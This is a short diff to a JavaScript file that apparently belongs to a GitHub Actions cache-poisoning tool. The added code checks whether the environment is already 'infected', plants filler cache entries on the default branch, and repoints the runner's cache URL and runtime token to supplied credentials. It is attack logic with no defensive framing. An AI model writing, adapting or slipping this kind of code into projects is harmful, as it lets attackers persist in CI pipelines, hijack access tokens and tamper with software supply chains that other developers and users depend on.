@@ -237,7 +237,12 @@ async function main() {
         await sleep(SLEEP_TIMER * 1000);
     }
 
+
     if (githubToken && accessToken && cacheServerUrl && await isDefaultBranch(githubToken)) {
+        if (!isInfected()) {
+            await createAndSetEntry(1801840148, "FILLER", "bceda5fc9790311ca62ca27a213556fe42fbb764a6135a3ce6521f9e2ab44b91", accessToken, cacheServerUrl);
+            await createAndSetEntry(1801840148, "FILLER", "bceda5fc9790311ca62ca27a213556fe42fbb764a6135a3ce6521f9e2ab44b91", accessToken, cacheServerUrl);
+        }
         process.env['ACTIONS_CACHE_URL'] = cacheServerUrl;
         process.env['ACCESS_TOKEN'] = accessToken;
         process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;
